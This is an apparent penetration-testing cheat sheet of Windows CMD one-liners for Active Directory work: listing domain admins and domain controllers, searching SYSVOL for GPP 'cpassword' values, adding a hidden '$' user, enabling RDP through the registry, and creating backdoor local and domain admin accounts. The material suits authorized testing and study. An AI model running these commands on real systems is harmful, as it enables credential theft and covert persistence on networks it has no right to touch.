---
title : "cmd"
# pre : '<i class="fas fa-code"></i> '
description : "Microsoft Command Prompt."
date : 2020-07-09T12:52:37+02:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## CMD - Command Prompt

{{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(exe)"/%}}

### Show Domain Admins / Enterprise Admins

`net group "Domain Admins" /domain`

`net group "Enterprise Admins" /domain`

### Run CMD on non-domain joined machine as domain user

`runas /netonly /user:<DOMAIN>\<USER> cmd.exe`

### Enable access to C-drive in Explorer

`subst z: c:\`

### Finding cpassword

`findstr /s /n /i /p cpassword \\<DOMAIN>\sysvol\*`

### Show privileges current user

```plain
$ whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
win10\johndo S-1-5-21-4192065701-4228146649-662612674-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### List domain controllers (DC)

```cmd
$ nltest /dclist:offsec.nl

Get list of DCs in domain 'offsec.nl' from '\\DC2016.offsec.nl'.
    DC2008R2.offsec.nl [PDC]  [DS] Site: Default-First-Site-Name
      DC2016.offsec.nl        [DS] Site: Default-First-Site-Name
      DC2019.offsec.nl        [DS] Site: Default-First-Site-Name
The command completed successfully
```

### Add less visible user

Local admin required.

`net user $ LetMeIn123! /add /active:yes`

### Enable / disable Remote Desktop (RDP)

You can enable (remotely) Remote Desktop (RDP) by adjusting the register key. Tip: use 'smbexec.py' / 'wmiexec.py' to enable on remote system where RDP is not enabled. Or use the CrackMapExec module RDP see [CrackMapExec]({{< ref "tools/framework/crackmapexec" >}}).

Enable

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

Disable

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f`

### Add Local Admin via CMD

Creation of the user 'NewLaForMe' - `net user NewLAForMe 'NotThatStrongPassword@' /add /Y`

Adding the user to the group - `net localgroup Administrators NewLAForMe /add`

### Add Domain Admin via CMD

Creation of the user 'NewDAForMe' - `net user NewDAForMe "NotThatStrongPassword@" /add /domain /Y`

Adding the user to the group - `net group "Domain Admins" NewDAForMe /add /domain`
